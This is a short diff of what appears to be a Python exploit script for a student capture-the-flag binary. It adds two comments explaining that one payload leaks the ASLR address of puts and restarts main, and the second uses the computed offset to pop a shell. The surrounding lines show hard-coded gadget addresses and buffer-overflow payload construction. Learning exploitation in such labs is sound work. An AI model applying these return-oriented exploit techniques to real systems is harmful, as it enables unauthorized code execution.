@@ -26,6 +26,7 @@ copy_line4 = b"\x00\x00\x00\x00\x00\x40\x11\x46"[::-1]
 main_line0 = b"\x00\x00\x00\x00\x00\x40\x11\x69"[::-1]
 
 
+# this payload leaks the ASLR address of puts and restarts main:
 payload1 = (
     buffer
     + backup_base_pointer  # for padding.
@@ -82,6 +83,7 @@ print('compare with gdb> info proc map')
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
 
+# this payload uses the calculated offset to pop a shell:
 payload2 = (
     buffer
     + backup_base_pointer
